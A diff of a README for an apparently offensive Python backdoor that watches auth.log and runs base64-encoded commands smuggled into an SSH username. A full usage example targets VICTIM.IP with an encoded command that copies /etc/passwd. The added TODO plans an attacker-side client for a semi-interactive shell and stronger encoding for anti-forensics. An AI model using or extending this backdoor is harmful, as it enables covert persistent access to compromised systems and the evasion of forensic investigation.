@@ -16,3 +16,6 @@ A post exploit python script that watches auth.log for a keyword then executes b
    Full example ```ssh shadow---Y2F0IC9ldGMvcGFzc3dkID4gL3RtcC90ZXN0@VICTIM.IP``` 
    
  
+### TODO
+1. Make client to run on attacker box that can handel responces sent out by backdoor. (Semi-interactive shel)
+2. Use better encoding/encryption on commands to aid in anti-forensics 
